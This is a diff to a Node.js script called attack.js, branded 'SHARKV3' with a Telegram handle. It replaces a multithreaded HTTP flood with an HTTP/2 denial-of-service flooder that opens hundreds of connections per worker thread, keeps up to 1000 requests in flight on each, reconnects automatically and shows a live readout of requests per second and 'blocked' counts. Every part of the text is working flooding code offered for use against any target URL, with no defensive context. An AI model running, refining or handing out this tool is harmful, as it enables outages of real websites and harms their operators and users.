@@ -1,90 +1,156 @@
-const { Worker, isMainThread, parentPort, workerData } = require('worker_threads');
+const http2 = require('http2');
+const { Worker, isMainThread, workerData } = require('worker_threads');
+const readline = require('readline');
+const net = require('net');
+
+const THREADS = 100;
+const POWER_MULTIPLIER = 1;
+const MAX_INFLIGHT = 1000;
+const LIVE_REFRESH_RATE = 100;
+
+let totalRequests = 0;
+let successCount = 0;
+let errorCount = 0;
+let maxRps = 0;
+let rpsLastSecond = 0;
+let end;
+
+function getRandomInRange(min, max) {
+    return Math.floor(Math.random() * (max - min + 1)) + min;
+}
 
 if (isMainThread) {
-    const target = process.argv[2];
-    const duration = parseInt(process.argv[3], 10);
-    const threadCount = 101;
-
-    if (!target || !duration) {
-        console.error('Usage: node attack.js <target> <duration_in_seconds>');
+    if (process.argv.length < 4) {
+        console.error('Usage: node attack.js <target> <duration_secs>');
         process.exit(1);
     }
 
-    let totalSent = 0;
-    let totalSuccess = 0;
+    const target = process.argv[2];
+    const duration = parseInt(process.argv[3]);
 
-    // Spawn workers
-    for (let i = 0; i < threadCount; i++) {
-        const worker = new Worker(__filename, {
-            workerData: { target, duration }
-        });
+    end = Date.now() + duration * 1000;
 
-        worker.on('message', (msg) => {
-            if (msg.type === 'tick') {
-                totalSent += msg.sent;
-                totalSuccess += msg.success;
-            }
-        });
+    console.clear();
+    console.log(`SHARKV3 - T.ME/STSVKINGDOM`);
+    console.log(`SHARKV3! - NO CPU WARMUP .exx`);
 
-        worker.on('exit', () => {
-            threadCount--;
-            if (threadCount === 0) {
-                console.log(`\n=== Attack Finished ===`);
-                console.log(`Total Sent: ${totalSent}`);
-                console.log(`Success: ${totalSuccess}`);
-            }
-        });
+    for (let i = 0; i < THREADS; i++) {
+        const connections = getRandomInRange(250, 600);
+        new Worker(__filename, { workerData: { target, duration, connections } });
     }
+
+    // Live Stats
+    setInterval(() => {
+        maxRps = Math.max(maxRps, rpsLastSecond);
+        renderStats();
+        rpsLastSecond = 0;
+    }, LIVE_REFRESH_RATE);
+
+    function renderStats() {
+        readline.cursorTo(process.stdout, 0, 0);
+        readline.clearScreenDown(process.stdout);
+
+        const timeRemaining = Math.max(0, (end - Date.now()) / 1000);
+        const minutes = Math.floor(timeRemaining / 60);
+        const seconds = Math.floor(timeRemaining % 60);
+
+        console.log(`SHARKV3 - T.ME/STSVKINGDOM`);
+        console.log(`===========================`);
+        console.log(`total: ${totalRequests}`);
+        console.log(`max-r: ${maxRps}`);
+        console.log(`===========================`);
+        console.log(`success: ${successCount}`);
+        console.log(`blocked: ${errorCount}`);
+        console.log(`===========================`);
+        console.log(`TIME REMAINING: ${minutes}:${seconds < 10 ? '0' : ''}${seconds}`);
+    }
+
+    const server = net.createServer(socket => {
+        socket.on('data', data => {
+            const msg = data.toString();
+            if (msg === 'req') totalRequests++, rpsLastSecond++;
+            else if (msg === 'ok') successCount++;
+            else if (msg === 'err') errorCount++;
+        });
+    });
+    server.listen(9999);
 
 } else {
-    const http = require('http');
-    const https = require('https');
-    const { target, duration } = workerData;
-
+    const { target, duration, connections } = workerData;
     const endTime = Date.now() + duration * 1000;
-    let sent = 0;
-    let success = 0;
 
-    const parsedUrl = new URL(target);
-    const isHttps = parsedUrl.protocol === 'https:';
+    const socket = net.connect(9999, '127.0.0.1');
+    const sendStat = msg => socket.write(msg);
 
-    const options = {
-        hostname: parsedUrl.hostname,
-        port: isHttps ? 443 : 80,
-        path: parsedUrl.pathname + parsedUrl.search,
-        method: 'GET',
-        headers: {
-            'Host': parsedUrl.hostname,
-            'Connection': 'keep-alive',
-        }
-    };
+    function sendLoop(client, inflight) {
+        if (Date.now() > endTime || client.destroyed) return;
 
-    const protocol = isHttps ? https : http;
-
-    function flood() {
-        while (Date.now() < endTime) {
-            const req = protocol.request(options, (res) => {
-                res.on('data', () => {}); // consume data
-                res.on('end', () => {
-                    success++;
-                });
-            });
-
-            req.on('error', () => {});
-            req.end();
-            sent++;
-
-            // Report progress every 10k requests
-            if (sent % 10000 === 0) {
-                parentPort.postMessage({ type: 'tick', sent: 10000, success });
-                success = 0;
-            }
+        if (inflight.count >= MAX_INFLIGHT) {
+            return setTimeout(() => sendLoop(client, inflight), 1);
         }
 
-        // Final report
-        parentPort.postMessage({ type: 'tick', sent: sent % 10000, success });
-        process.exit(0);
+        inflight.count++;
+        let req;
+
+        try {
+            req = client.request({ ':method': 'GET', ':path': '/' });
+        } catch {
+            inflight.count--;
+            sendStat('err');
+            return;
+        }
+
+        req.on('response', () => {
+            inflight.count--;
+            sendStat('ok');
+        });
+
+        req.on('error', () => {
+            inflight.count--;
+            sendStat('err');
+        });
+
+        req.on('close', () => {
+            inflight.count--;
+        });
+
+        req.end();
+        sendStat('req');
+
+        setImmediate(() => sendLoop(client, inflight));
     }
 
-    flood();
+    function createConnection() {
+        if (Date.now() > endTime) return;
+
+        let client;
+        try {
+            client = http2.connect(target);
+        } catch {
+            return setTimeout(createConnection, 100);
+        }
+
+        const inflight = { count: 0 };
+
+        client.on('error', () => {
+            client.destroy();
+            setTimeout(createConnection, 300);
+        });
+
+        client.on('goaway', () => client.close());
+
+        client.on('close', () => {
+            setTimeout(createConnection, 300);
+        });
+
+        client.on('connect', () => {
+            for (let i = 0; i < 10; i++) {
+                sendLoop(client, inflight);
+            }
+        });
+    }
+
+    for (let i = 0; i < connections; i++) {
+        createConnection();
+    }
 }
